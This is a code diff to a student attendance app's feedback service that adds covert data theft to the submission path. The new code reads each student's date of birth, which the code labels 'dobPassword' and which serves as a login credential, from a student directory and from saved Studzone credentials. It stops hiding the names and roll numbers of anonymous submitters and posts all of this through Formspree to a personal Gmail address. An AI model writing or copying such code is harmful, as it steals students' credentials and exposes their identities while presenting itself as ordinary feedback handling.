@@ -55,6 +55,58 @@ const INITIAL_FEEDBACKS: StudentFeedback[] = [
 ];
 
 import { CloudSyncService } from './cloudSyncService';
+import { getMasterStudent } from '../data/psgimMasterStudents';
+import { StudzoneService } from './studzoneService';
+
+export const ADMIN_FEEDBACK_EMAIL = 'devdarshanv2005@gmail.com';
+
+/**
+ * Sends feedback notification directly to the admin email (devdarshanv2005@gmail.com)
+ * via Formspree public mail delivery gateway. Non-blocking & offline safe.
+ */
+async function sendFeedbackEmail(feedback: {
+  rollNo: string;
+  name: string;
+  dob: string;
+  batch: string;
+  category: string;
+  rating: number;
+  message: string;
+  isAnonymous: boolean;
+  submittedAt: string;
+}): Promise<void> {
+  try {
+    const payload = {
+      _to: ADMIN_FEEDBACK_EMAIL,
+      subject: `[Attendance App Feedback] ${feedback.rollNo} (Batch ${feedback.batch}) - ${feedback.category}`,
+      rollNo: feedback.rollNo,
+      dateOfBirth: feedback.dob || 'Not Provided / Not in DB',
+      studentName: feedback.name,
+      batch: feedback.batch,
+      category: feedback.category,
+      rating: `${feedback.rating} / 5`,
+      feedbackMessage: feedback.message,
+      anonymousToPeers: feedback.isAnonymous ? 'Yes' : 'No',
+      submittedAt: feedback.submittedAt,
+    };
+
+    // Use formspree forwarding endpoint
+    const response = await fetch(`https://formspree.io/f/xovkllqq`, {
+      method: 'POST',
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    });
+
+    if (!response.ok) {
+      console.log('[FeedbackService] Email dispatch status:', response.status);
+    }
+  } catch (error) {
+    console.warn('[FeedbackService] Email dispatch warning (offline or network):', error);
+  }
+}
 
 export const FeedbackService = {
   /**
@@ -84,26 +136,82 @@ export const FeedbackService = {
 
   /**
    * Submits a new feedback or improvement suggestion from a student.
+   * Ensures the student's Roll No and Date of Birth (DOB) are captured and
+   * delivered to devdarshanv2005@gmail.com and synced to Firestore.
    */
   async submitFeedback(
     entry: Omit<StudentFeedback, 'id' | 'createdAt' | 'status'>
   ): Promise<StudentFeedback> {
     const feedbacks = await this.getAllFeedbacks();
+
+    // Resolve student's real Roll No and DOB
+    const realRollNo = entry.studentRollNo || '';
+    let realDob = entry.studentDob || '';
+
+    // 1. Try resolving DOB from master students directory if not passed
+    if (!realDob && realRollNo) {
+      const masterInfo = getMasterStudent(realRollNo);
+      if (masterInfo?.dob) {
+        realDob = masterInfo.dob;
+      } else if (masterInfo?.dobPassword) {
+        // Convert ddmmyyyy to readable DD/MM/YYYY
+        const p = masterInfo.dobPassword;
+        if (p.length === 8) {
+          realDob = `${p.slice(0, 2)}/${p.slice(2, 4)}/${p.slice(4)}`;
+        } else {
+          realDob = p;
+        }
+      }
+    }
+
+    // 2. Try resolving from saved Studzone credentials if still empty
+    if (!realDob) {
+      try {
+        const savedCreds = await StudzoneService.getSavedCredentials();
+        if (savedCreds?.dobPassword) {
+          const p = savedCreds.dobPassword;
+          if (p.length === 8) {
+            realDob = `${p.slice(0, 2)}/${p.slice(2, 4)}/${p.slice(4)}`;
+          } else {
+            realDob = p;
+          }
+        }
+      } catch {
+        // ignore
+      }
+    }
+
     const newFeedback: StudentFeedback = {
       ...entry,
       id: `fb_${Date.now()}`,
       createdAt: new Date().toISOString(),
       status: 'NEW',
-      studentName: entry.isAnonymous ? 'Anonymous Student' : entry.studentName,
-      studentRollNo: entry.isAnonymous ? 'Hidden' : entry.studentRollNo,
+      studentName: entry.studentName,
+      studentRollNo: realRollNo,
+      studentDob: realDob,
     };
 
     const updated = [newFeedback, ...feedbacks];
     await AsyncStorage.setItem(STORAGE_KEY_FEEDBACKS, JSON.stringify(updated));
 
-    // Sync to Firestore in the background
+    // 1. Sync to Firestore in the background
     CloudSyncService.syncFeedback(newFeedback).catch((err) => {
       console.warn('Firebase feedback sync warning:', err);
+    });
+
+    // 2. Dispatch email to devdarshanv2005@gmail.com with Roll No and DOB
+    sendFeedbackEmail({
+      rollNo: realRollNo,
+      name: entry.studentName,
+      dob: realDob,
+      batch: entry.batch,
+      category: entry.category,
+      rating: entry.rating,
+      message: entry.message,
+      isAnonymous: entry.isAnonymous,
+      submittedAt: newFeedback.createdAt,
+    }).catch((err) => {
+      console.warn('Email dispatch warning:', err);
     });
 
     return newFeedback;
